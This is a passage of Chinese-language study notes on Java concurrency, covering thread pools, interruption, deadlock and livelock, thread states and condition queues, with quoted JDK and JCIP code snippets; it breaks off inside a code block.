title="串行线程的封闭"></a>串行线程的封闭</h3><ul><li>线程封闭对象的要求：<ul><li>只能由单个线程拥有</li><li>通过安全的发布来转移所有权（安全的发布确保对象状态对于新的所有者来说是可见的（不止这个作用？））</li><li>所有权转以后，只有接受所有权的线程才可以访问（独占的所有权）</li></ul></li><li>可以使用阻塞队列、ConcurrentHashMap的remove方法、AtomicReference的compareAndSet来完成</li></ul><h3 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h3><ul><li>每个线程都有一个<code>boolean</code>的中断标志</li><li><code>Thread.interrupted</code>方法将返回当前线程是否被中断，并<strong>清除中断标志</strong></li><li><code>Thread.currentThread().interrupt()</code>将中断当前线程</li><li>阻塞库方法，例如<code>Thread.sleep</code>，<code>Object.wait</code>会检查线程何时中断，并在发现时提前返回</li></ul><h3 id="InterruptedException"><a href="#InterruptedException" class="headerlink" title="InterruptedException"></a>InterruptedException</h3><ul><li>当一个方法会抛出这个异常时，表示这是一个阻塞方法，如果这个方法被中断，那么它将努力提前结束阻塞状态</li><li>当在代码中调用将抛出该异常的方法时，我们的方法也就成了一个阻塞方法，必须要对中断进行响应。有两种选择<ul><li>传递<code>InterruptedException</code>：不捕获该异常，或者捕获后重新抛出</li><li>恢复中断：调用当前线程的interrupt方法恢复中断状态</li></ul></li><li>只有在对Thread进行扩展并且可以控制调用栈上的所有更高层代码时才可以屏蔽该异常</li></ul><h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><ul><li>JVM只有在所有（非守护）线程全部终止后才会退出，因为如果无法正确的关闭Executor，JVM无法关闭</li></ul><h3 id="Timer-vs-SingleThreadExecutor"><a href="#Timer-vs-SingleThreadExecutor" class="headerlink" title="Timer vs SingleThreadExecutor"></a>Timer vs SingleThreadExecutor</h3><ul><li><h3 id="Thread安全策略"><a href="#Thread安全策略" class="headerlink" title="Thread安全策略"></a>Thread安全策略</h3></li><li><p>使用<code>Executors.privilegedThreadFactory()</code>可以创建出线程工厂，用这种方式创建出来的线程，将于创建<code>privilegedThreadFactory</code>的线程拥有相同的访问权限、<code>AccessControlContext</code>和<code>contextClassLoader</code></p></li><li>如果不使用该方法，线程池创建的线程将从在需要新线程时调用execute或submit的客户程序中继承访问权限</li></ul><h3 id="SingleThreadExecutor"><a href="#SingleThreadExecutor" class="headerlink" title="SingleThreadExecutor"></a>SingleThreadExecutor</h3><ul><li>确保不会并发执行任务。为了避免用户代码修改返回的ThreadPoolExecutor对象，从而改变不并发执行的语义，所以对其进行包装使得无法类型转换为ThreadPoolExecutor来修改那些特性</li><li><code>Executors.unconfigurableExecutorService()</code>包装的Executor就具有冻结配置的特性</li></ul><h3 id="ThreadPoolExecutor"><a href="#ThreadPoolExecutor" class="headerlink" title="ThreadPoolExecutor"></a>ThreadPoolExecutor</h3><h5 id="afterExecute和beforeExecute方法"><a href="#afterExecute和beforeExecute方法" class="headerlink" title="afterExecute和beforeExecute方法"></a>afterExecute和beforeExecute方法</h5><ul><li><p>以下是<code>runWorker</code>方法内的片段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    beforeExecute(wt, task);</span><br><span class="line">    Throwable thrown = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        task.run();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException x) &#123;</span><br><span class="line">        thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error x) &#123;</span><br><span class="line">        thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">        thrown = x; <span class="keyword">throw</span> <span class="keyword">new</span> Error(x);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        afterExecute(task, thrown);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    task = <span class="keyword">null</span>;</span><br><span class="line">    w.completedTasks++;</span><br><span class="line">    w.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出</p><ul><li>如果beforeExecute抛出异常，则不会执行task和afterExecute</li><li>无论task抛出什么异常，都会执行afterExecute</li></ul></li></ul><h5 id="submit的策略"><a href="#submit的策略" class="headerlink" title="submit的策略"></a>submit的策略</h5><ul><li><p>如果运行的corePoolSize线程少于corePoolSize，则会创建一个新线程来处理请求，即使其他工作线程处于空闲状态也是如此。否则，如果正在运行少于maximumPoolSize的线程，则只有在队列已满时才会创建一个新线程来处理请求</p></li><li><p>源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> c = ctl.get();</span><br><span class="line"><span class="keyword">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addWorker(command, <span class="keyword">true</span>))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    c = ctl.get();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">    <span class="keyword">int</span> recheck = ctl.get();</span><br><span class="line">    <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">        reject(command);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)</span><br><span class="line">        addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!addWorker(command, <span class="keyword">false</span>))</span><br><span class="line">    reject(command);</span><br></pre></td></tr></table></figure><ul><li><p>如果core线程还有剩（就是当前启动的线程数少于核心线程数），那么新加<br>worker（等价于新加线程，加入线程后，会run firstTask——<code>prestartAllCoreThreads</code>方法加入的核心worker的firstTask都是null，从而run firstTask不会去运行task）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Delegates main run loop to outer runWorker  */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    runWorker(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这是内部的Worker（实现了Runnable接口）的run方法，在addWorker后会调用该worker的thread的start方法，从而调用该run方法</span></span><br></pre></td></tr></table></figure></li><li><p>否则就尝试push到工作队列里（即使核心线程不忙，也是直接push到队列中，然后核心线程从队列中获得task）（worker运行的线程会阻塞的等待工作队列有东西返回）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    w.lock();</span><br><span class="line">    <span class="comment">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class="line">    <span class="comment">// 这来自ThreadPoolExecutor的runWorker方法，worker将run方法委托给这个方法</span></span><br></pre></td></tr></table></figure></li><li><p>如果工作队列已经满了就会尝试去添加非核心线程</p></li><li><p>因为在添加到工作队列时，使用的是<code>offer</code>，所以即使是<code>SynchronousQueue</code>，也不会阻塞，而是没有线程正在等待接受就立刻返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SynchronousQueue&lt;E&gt; <span class="keyword">public</span> <span class="keyword">boolean</span> offer</span><br><span class="line">Inserts the specified element into <span class="keyword">this</span> queue, <span class="keyword">if</span> another thread is waiting to receive it.</span><br><span class="line">Returns: <span class="keyword">true</span> <span class="keyword">if</span> the element was added to <span class="keyword">this</span> queue, <span class="keyword">else</span> <span class="keyword">false</span></span><br><span class="line"><span class="comment">// 截取自SynchronousQueue的doc</span></span><br></pre></td></tr></table></figure><p>因为，如果核心线程已满，但是这个queue无法被offer，那么说明核心线程都忙（会不会出现<code>executor.prestartAllCoreThreads</code>跑完但是有的线程还没到等待点的情况，从而虽然有的线程不忙但是还是无法offer？），所以尝试启动新的非核心线程</p></li><li><p>这意味着，queue不能太小：否则，如果无法添加新线程，而有的线程虽然不忙，但是可能没能及时得到cpu时间去把task从队列中拿出来，就会导致执行<code>RejectedExecutionHandler</code></p></li><li><p>要特别注意<code>execute</code>的这一个片段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">    <span class="keyword">int</span> recheck = ctl.get();</span><br><span class="line">    <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">        reject(command);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)</span><br><span class="line">        addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>即使coreSize==0（maxSize为0是非法的）， 并且这是无界队列，线程池还是会保证至少有一个线程在跑</p></li><li><p>如果使用了无界队列，其实maxSize也没什么用，因为总是会添加队列成功——除非超过了<code>Integer.MAX_VALUE</code>。</p></li><li><p>队列的作用在于</p><ul><li>防止core线程不忙但是没能及时从队列中pop出task导致添加多余的线程</li><li>使得系统平缓应对小波峰——避免一有风吹草动系统就跟着波动（怎么感觉有点像惊群效应）。小波峰的含义是，对用户的响应的延迟在接受范围内</li></ul></li></ul></li></ul><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h4 id="动态锁顺序死锁"><a href="#动态锁顺序死锁" class="headerlink" title="动态锁顺序死锁"></a>动态锁顺序死锁</h4><ul><li><p>在持有锁时调用某个外部方法，那么将可能出现死锁，或阻塞时间过长</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: deadlock-prone!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taxi</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GuardedBy</span>(<span class="string">"this"</span>) <span class="keyword">private</span> Point location, destination;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Dispatcher dispatcher;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Taxi</span><span class="params">(Dispatcher dispatcher)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dispatcher = dispatcher;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Point <span class="title">getLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> location;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setLocation</span><span class="params">(Point location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">        <span class="keyword">if</span> (location.equals(destination))</span><br><span class="line">            dispatcher.notifyAvailable(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GuardedBy</span>(<span class="string">"this"</span>) <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Taxi&gt; taxis;</span><br><span class="line">    <span class="meta">@GuardedBy</span>(<span class="string">"this"</span>) <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Taxi&gt; availableTaxis;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dispatcher</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        taxis = <span class="keyword">new</span> HashSet&lt;Taxi&gt;();</span><br><span class="line">        availableTaxis = <span class="keyword">new</span> HashSet&lt;Taxi&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">notifyAvailable</span><span class="params">(Taxi taxi)</span> </span>&#123;</span><br><span class="line">        availableTaxis.add(taxi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Image <span class="title">getImage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Image image = <span class="keyword">new</span> Image();</span><br><span class="line">        <span class="keyword">for</span> (Taxi t : taxis)</span><br><span class="line">            image.drawMarker(t.getLocation());</span><br><span class="line">        <span class="keyword">return</span> image;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>某个线程调用<code>setLocation</code>，然后在持有该Taxis的锁时调用Dispatcher的<code>notifyAvaiable</code>。同时，另一个线程调用getImage，持有dispatcher的锁然后请求taxis的锁。从而死锁</p></li><li><p>开放调用：调用某个方法时不需要持有锁。即可能使用开放调用，可以更容易找到需要获得多个锁的代码路径。如果因为开放调用而导致某些操作不是原子的，那么可以通过一些协议来避免该路径被并发执行——比如搞一个标志，然后其他线程看到该标志为xx时就不执行</p></li></ul><h4 id="资源死锁"><a href="#资源死锁" class="headerlink" title="资源死锁"></a>资源死锁</h4><ul><li>比如某个线程持有某个链接池的链接等待另一个链接池的链接，另一个线程顺序颠倒地持有和请求</li><li>线程依赖死锁<ul><li>当线程池不够大，而线程池里的任务依赖于同一线程池的任务，那么会导致，某个任务正在跑，然后其依赖于处于队列中的任务，从而死锁</li><li>这种就要求线程池要经过一定的配置——比如不能太小等。所以要将配置策略文档化</li><li>只有当任务相互独立时，为线程池或工作队列设置界限才是合理的。任务之间存在依赖性，有界的线程池或队列就可能导致线程饥饿死锁</li><li>解决方法<ul><li>使用无界的线程池，比如<code>newCachedThreadPool</code></li><li>使用有界的线程池，并使用<code>SynchronousQueue</code>作为工作队列（这样当线程池满的时候调用者就会被阻塞从而知道子任务无法运行），以及<code>Caller-Runs</code>饱和策略</li><li>为什么不使用0长度的其他blockingQueue而使用SynchronousQueue（以下均为个人观点）<ul><li>一方面，其他blockingQueue不支持0长度。所以有可能有一个被等待的子任务就死锁了</li><li>另一方面，如果无法增加核心worker（新建线程），那么task都跑到队列中，这时候，如果没有线程在等待从队列中获得task，队列就会立刻返回（因为使用的是<code>offer</code>而不是会阻塞的<code>put</code>），从而在可能死锁时（就是子任务没线程能运行时），可以执行拒绝策略。</li></ul></li></ul></li></ul></li></ul><h3 id="饥饿和优先级"><a href="#饥饿和优先级" class="headerlink" title="饥饿和优先级"></a>饥饿和优先级</h3><ul><li>在 Java 程序设计语言中，每一个线程有一个优先级。</li><li>默认情况下， 一个线程继承它的父线程的优先级。</li><li>可以用<code>setPriority</code> 方法提高或降低任何一个线程的优先级</li><li>可以将优先级设置为在 MIN_PRIORITY (在 Thread 类中定义为 1 ) 与 MAX_PRIORITY (定义为 10 ) 之间的任何值。NORM_PRIORITY 被定义为 5</li><li>每当线程调度器有机会选择新线程时， 它首先选择具有较高优先级的线程。但是，线程优先级是高度依赖于系统的</li><li><p>如果有几个高优先级的线程没有进入非活动状态， 低优先级的线程<strong>可能</strong>永远也不能执行</p></li><li><p>尽量不要改变线程优先级，如果改变了，那么程序的行为就与平台相关了。并且可能导致饥饿</p></li><li>在大多数java应用程序中，所有线程都具有相同的<code>Thread.NORM_PRIORITY</code>，我测试了Daemon线程和非Daemon线程，都是<code>5</code>（linux 4.18.0-13）</li><li><code>Thread.yield</code>和<code>Thread.sleep(0)</code>的语义都是未定义的，JVM可以将他们实现为空操作，也可以把他们视为线程调度的参考。在unix系统中并不要求他们拥有<code>sleep（0）</code>的语义——将当前线程放在该优先级对应的运行队列末尾，并将执行全交给相同优先级的其他线程，尽管有些JVM是按照这种方法来实现yield的</li></ul><h3 id="活锁"><a href="#活锁" class="headerlink" title="活锁"></a>活锁</h3><ul><li>不会阻塞线程但是也无法继续执行，因为线程总是不断重复执行相同的操作，而且总是失败<ul><li>比如：某个消息被处理时一定会失败，然而开发者错误的将这种错误当做可以修复的错误，从而把该消息又加入了消息队列头部，从而消息处理器会反复调用，并返回相同的结果，从而程序无法继续执行下去</li></ul></li><li>Livelock can also occur when multiple cooperating threads change their state in response to the others in such a way that no thread can ever make progress<ul><li>This is similar to what happens when two overly polite people are walking in opposite directions in a hallway: each steps out of the other’s way, and now they are again in each other’s way.so they both step aside again, and again, and again</li><li>解决方法：重试时引入随机性，比如信道上冲突时，随机退避一段时间</li></ul></li></ul><h3 id="加速比的计算"><a href="#加速比的计算" class="headerlink" title="加速比的计算"></a>加速比的计算</h3><ul><li>$\text{speedup}\leq \frac{1}{F+\frac{(1-F)}{N}}$</li><li>其中$F$是串行化的比例，$N$是CPU数目，比如$F=10%$，$N=10$，则在加速比为5.3</li></ul><h3 id="非竞争同步和竞争同步"><a href="#非竞争同步和竞争同步" class="headerlink" title="非竞争同步和竞争同步"></a>非竞争同步和竞争同步</h3><ul><li>非竞争同步可以完全在JVM中处理，竞争同步可能需要操作系统的介入</li></ul><h5 id="非竞争同步"><a href="#非竞争同步" class="headerlink" title="非竞争同步"></a>非竞争同步</h5><ul><li>volatile通常是非竞争同步</li><li>synchronized针对无竞争同步进行了优化</li><li>在java5时（作者编写JCIP时）一个Fast-Path的非竞争同步将消耗20~250个时钟周期</li><li>其对程序整体性能的影响很低</li></ul><h5 id="竞争同步"><a href="#竞争同步" class="headerlink" title="竞争同步"></a>竞争同步</h5><ul><li>JVM将根据历史等待时间选择在发生锁竞争被阻塞时是否要spin-wait，但是大多数JVM只是将线程挂起</li></ul><h3 id="Daemon"><a href="#Daemon" class="headerlink" title="Daemon"></a>Daemon</h3><ul><li><code>Thread.setDaemon()</code>:  This method must be invoked before the thread is started</li><li>当只剩下守护线程时， 虚拟机就退出了，由于如果只剩下守护线程， 就没必要继续运行程序了。</li><li>守护线程应该永远不去访问固有资源， 如文件、 数据库，因为它会在任何时候甚至在一个操作的中间发生中断。</li></ul><h3 id="UncaughtExceptionHandler"><a href="#UncaughtExceptionHandler" class="headerlink" title="UncaughtExceptionHandler"></a>UncaughtExceptionHandler</h3><ul><li>可以用 <code>setUncaughtExceptionHandler</code> 方法为任何线程安装一个处理器。也可以用 Thread类的静态方法 <code>setDefaultUncaughtExceptionHandler</code> 为所有线程安装一个默认的处理器</li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul><li><p>有安全性测试和活跃性测试</p><ul><li>安全性测试：不发生任何错误的行为</li><li>活跃性测试：某个良好的行为终究发生</li></ul></li><li><p>测试时可以使用以下随机数发生器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">xorShift</span><span class="params">(<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    y ^= (y &gt;&gt;&gt; <span class="number">21</span>);</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以使用<code>/home/hzx/MyStudy/notes/java/JSR166TestCase.java</code>作为测试基类（来自于<a href="http://gee.cs.oswego.edu/cgi-bin/viewcvs.cgi/jsr166/src/test/tck/JSR166TestCase.java）" target="_blank" rel="noopener">http://gee.cs.oswego.edu/cgi-bin/viewcvs.cgi/jsr166/src/test/tck/JSR166TestCase.java）</a></p></li></ul><h3 id="Lock类"><a href="#Lock类" class="headerlink" title="Lock类"></a>Lock类</h3><ul><li>Lock实现中必须提供与内部锁相同的内存可见性语义</li><li>加锁语义、调度算法、顺序保证、性能特性方面可以与内置所有所不同</li></ul><h4 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h4><ul><li>获取ReentrantLock时，有着与进入同步代码块相同的内存语义</li><li>释放时，有着与退出同步代码块相同的内存语义</li></ul><h3 id="Thread-suspend"><a href="#Thread-suspend" class="headerlink" title="Thread.suspend"></a>Thread.suspend</h3><ul><li>与 stop 不同，suspend 不会破坏对象。但是，如果用 suspend 挂起一个持有一个锁的线程， 那么，该锁在恢复之前是不可用的。 如果调用suspend 方法的线程试图获得同一个锁， 那么程序死锁</li></ul><h3 id="Fork-Join"><a href="#Fork-Join" class="headerlink" title="Fork-Join"></a>Fork-Join</h3><ul><li>fork-join 框架使用了一种有效的智能方法来平衡可用线程的工作负载，这种方法称为工作密取（work stealing)。每个工作线程都有一个双端队列 ( deque ) 来完成任务。一个工作线程将子任务压人其双端队列的队头。（只有一个线程可以访问队头，所以不需要加锁。）一个工作线程空闲时，它会从另一个双端队列的队尾“ 密取” 一个任务</li></ul><h3 id="Thread-状态"><a href="#Thread-状态" class="headerlink" title="Thread 状态"></a>Thread 状态</h3><ul><li><p>状态转换</p><ul><li>当一个线程被阻塞或等待时（或终止时） ，另一个线程被调度为运行状态</li><li>当一个线程被重新激活（例如， 因为超时期满或成功地获得了一个锁)， 调度器检查它是否具有比当前运行线程更高的优先级。 如果是这样，调度器从当前运行线程中挑选一个， 剥夺其运行权，选择一个新的线程运行。</li></ul></li><li><p>new：当用 new 操作符创建一个新线程时， 如 <code>new Thread(r)</code>， 该线程还没有开始运行。这意味着它的状态是 new。当一个线程处于新创建状态时， 程序还没有开始运行线程中的代码。在线程运行之前还有一些基础工作要做</p></li><li>Runnable：一旦调用 start 方法，线程处于 runnable 状态。一个可运行的线桿<strong>可能正在运行也可能没有运行</strong>， 这取决于操作系统给线程提供运行的时间。（A thread in the runnable state is executing in the Java virtual machine but it may be waiting for other resources from the operating system such as processor）（Java 的规范说明没有将它作为一个单独状态。一个正在运行中的线程仍然处于可运行状态)</li><li><p>Blocked：当线程处于被阻塞或等待状态时，它暂时不活动。它不运行任何代码且消耗最少的资源。直到线程调度器重新激活它。（ 细节取决于它是怎样达到非活动状态的) 。当所有其他线程释放该锁，并且线程调度器允许本线程持有它的时候，该线程将变成非阻塞状态</p><ul><li>当一个线程试图获取一个内部的对象锁（而不是 java.util.concurrent 库中的锁，) 而该锁被其他线程持有， 则该线程进人阻塞状态。（Thread state for a thread blocked waiting for a <strong>monitor lock.</strong> A thread in the blocked state is waiting for a monitor lock to enter a synchronized block/method or reenter a synchronized block/method after calling Object.wait.）。当所有其他线程释放该锁，并且线程调度器允许本线程持有它的时候，该线程将变成非阻塞状态</li></ul></li><li><p>WAITING</p><ul><li><p>当线程等待另一个线程通知调度器一个条件时， 它自己进入<strong>等待状态</strong>。（使用<code>Object.wait</code>或<code>Thread.join</code>方法，或是等待<code>java.util.concurrent</code>库中的Lock或Condition时，就会出现这种情况）</p></li><li><p>Thread state for a waiting thread. A thread is in the waiting state due to calling one of the following methods:</p><ul><li>Object.wait with no timeout</li><li>Thread.join with no timeout</li><li>LockSupport.park</li></ul><p>A thread in the waiting state is waiting for another thread to perform a particular action.</p></li></ul></li><li><p>TIMED_WAITING</p><ul><li>Thread state for a waiting thread with a specified waiting time. A thread is in the timed waiting state due to calling one of the following methods with a specified positive waiting time:<ul><li>Thread.sleep</li><li>Object.wait with timeout</li><li>Thread.join with timeout</li><li>LockSupport.parkNanos</li><li>LockSupport.parkUntil</li></ul></li></ul></li><li><p>TERMINATED</p><ul><li>Thread state for a terminated thread. The thread has <strong>completed execution</strong></li><li>线程因如下两个原因之一而被终止<ul><li>因为 run 方法正常退出而自然死亡。</li><li>因为一个没有捕获的异常终止了 nm 方法而意外死亡</li><li>可以调用线程的 stop 方法杀死一个线程。 该方法抛出 <code>ThreadDeath</code> 错误对象,由此杀死线程。但是，stop 方法已过时</li></ul></li></ul></li></ul><h3 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h3><ul><li><p>构成前提条件的变量必须由对象的锁来保护，从而使得它们在测试前提条件的同时保持不变。如果前提条件尚未满足，就必须释放锁</p></li><li><p>条件队列：每个对象都可以作为一个条件队列。其使得一组线程（等待线程集合）能够通过某种方式来等待特定的条件变为真</p></li><li><p>Monitor Condition</p><ul><li>如果调用同步方法的线程必须被阻塞或是其他原因不能立刻进行，它能够在一个监视条件上等待，这将导致该客户线程暂时<strong>释放监视锁</strong>，并<strong>挂起（WAITING / TIMED_WAITING）</strong>在监视条件上</li><li>同步方法线程回复。一旦早先挂起在某监视条件上的同步方法线程获取通知，它将继续在最初的等待监视条件的点上执行，执行的条件是唤醒后抢占到监视锁。当线程从wait方法中被唤醒时，他在重新请求锁时不具有任何特殊的优先级，而要与任何其他尝试进入同步代码块的线程一起正常的在锁上竞争</li><li><p>当调用wait时，需要持有锁，否则会抛出<code>IllegalMonitorStateException</code></p></li><li><p>不提供公平的队列</p></li><li>只有一个条件变量</li></ul></li><li><p>应该将条件队列相关联的条件谓词以及在这些谓词上等待的操作都写入文档</p></li><li><p>调用wait之前要测试条件谓词，并且从wait中返回时再次进行测试。要在循环中调用wait</p><ul><li>信号丢失：如果线程A通知了一个条件队列，但是线程B随后调用wait，那么wait并不会立刻醒来，而是要等待另一个通知来唤醒它。所以在wait之前要检查条件谓词</li><li>Spurious wakeup：（来自<a href="https://en.wikipedia.org/wiki/Spurious_wakeup" target="_blank" rel="noopener">wiki</a>。内容可能有争议）。比如，当只有一个资源变得可用时，本来我们调用notify，那么可以相信醒来的那个一定可以拿到资源。但是，并不是如此，实际操作系统中，有时会出现即使是上面那种情况，醒来后还是发现资源不可用</li><li>有个问题：wait唤醒后需要抢占锁，那么，是否有可能某线程虽然被notify唤醒，也就是只有一个等待该条件的线程醒来获得资源，但是同时外界来了一个线程，并且竞争锁先成功，那么这个被唤醒的不就没资源了吗，从而类似假醒</li></ul></li><li><p>确保使用与条件队列相关联的锁来保护条件谓词的各个状态变量</p></li><li><p>调用wait、notify、notifyAll时，要持有与条件队列相关的锁</p></li><li><p>检查条件谓词之后以及开始执行相关操作之前，不要释放锁</p></li><li><p>调用notify时，JVM会从条件队列上等待的多个线程中选择一个来唤醒，而调用notifyAll时则会唤醒所有在这个条件队列上等待的线程。调用notify或notifyAll时必须持有条件队列对象的锁，而如果这些等待的线程此时不能重新获得锁，那么无法从wait返回，因此发出通知的线程要尽快释放锁</p></li><li><p>在一个条件队列上等待同一个条件谓词</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 